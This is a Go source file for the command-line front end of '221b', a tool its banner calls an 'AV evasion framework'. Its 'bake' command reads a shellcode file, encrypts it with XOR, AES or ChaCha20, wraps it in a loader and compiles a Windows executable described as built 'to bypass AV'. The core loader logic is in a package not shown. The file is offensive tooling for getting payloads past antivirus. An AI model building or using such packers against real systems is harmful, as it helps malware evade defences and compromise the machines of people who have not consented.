package cli

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/spf13/cobra"

	"github.com/cmepw/221b/loader"
	"github.com/cmepw/221b/logger"
)

var (
	shellPath string
	key       string
	output    string
	method    string
)

const ASCII_ART = `
                    +.                  
                    %:                     -==[ 2 2 1 b ]==-
                    %:     :        -   
   .+*+===++===-----%:   :%-      =#:          
   #-               %-  =@:     .@@.    
  .#                %-=%@=     -%#.     
  .%                %#@@*     #@#       
   %.               %@%-    .#@%.     - 
   #:               %%     =@@*     :%* 
  -%                %-   .#@@+     =@=  
 =@:                %-  .%@%=    +@@=   
 @%                 %- -@@*     *@@*    
:@*                 %-*@@=    :#@%-      AV evasion framework
:@#    :---:..      %%@@-    -@@%:.    -
 @%    +%%###*+-:   %@+. :=++%@%%*. .+%*
 *@    .*@####%@*-  %+  :#%%###%#.  %@@.
 :@-    .:*%%%%#+:  %-  .*@%%%*=. :%@*. 
  +*       .....    %-   *@*..   -@@+   
   #=               %-  +%:     -@#-    
    -%#:            %-=%*      -#:      
     = #*.          %*%:      =#        
        -*=         %*       .-         
          +%.       %-                  
         -=.==-::::.%-                  
        *-     .....%:                  CMEPW Team
       :.           %:                  
                    %:                  
`

var (
	ErrMissingShellPath   = fmt.Errorf("missing shellPath argument")
	ErrMissingKey         = fmt.Errorf("missing key argument")
	ErrMethodNotSupported = fmt.Errorf("provided encryption method isn't supported, please choose: 'aes', 'xor', 'chacha20'")
)

var bake = &cobra.Command{
	Use:   "bake",
	Short: "Build a windows payload with the given shell encrypted in it to bypass AV",
	Long:  ASCII_ART,
	Run: func(cmd *cobra.Command, args []string) {
		if shellPath == "" {
			logger.Fatal(ErrMissingShellPath)
		}

		if key == "" {
			logger.Fatal(ErrMissingKey)
		}

		if output == "" {
			output = strings.TrimSuffix(filepath.Base(shellPath), filepath.Ext(shellPath)) + loader.WindowsExt
			logger.Warn(fmt.Sprintf("output path set to default: %s", output))
		}

		loader, ok := loader.Method[method]
		if !ok {
			logger.Fatal(ErrMethodNotSupported)
		}

		logger.Info(fmt.Sprintf("use %s encryption method", method))
		logger.Debug(fmt.Sprintf("baking %s with key %s", shellPath, key))

		logger.Debug(fmt.Sprintf("reading %s", shellPath))
		file, err := os.ReadFile(shellPath)
		if err != nil {
			logger.Fatal(err)
		}

		logger.Info(fmt.Sprintf("encrypting %s", shellPath))

		encryptedShell, err := loader.Encrypt(file, []byte(key))
		if err != nil {
			logger.Fatal(err)
		}

		logger.Info(fmt.Sprintf("loading encrypted shell into payload"))

		content, err := loader.Load(encryptedShell, []byte(key))
		if err != nil {
			logger.Fatal(err)
		}

		if logger.DebugMode {
			logger.Debug("content")
			fmt.Println(string(content))
		}

		logger.Info("compiling binary")

		if err := loader.Compile(output, content); err != nil {
			logger.Fatal(err)
		}
	},
}

func init() {
	bake.Flags().StringVarP(&shellPath, "shellPath", "s", "", "path to the shell scrypt")
	bake.Flags().StringVarP(&key, "key", "k", "", "key to use for the xor")
	bake.Flags().StringVarP(&output, "output", "o", "", "output path (e.g., /home/bin.exe)")
	bake.Flags().StringVarP(&method, "method", "m", "xor", "encryption method : chacha20, aes, xor")
}
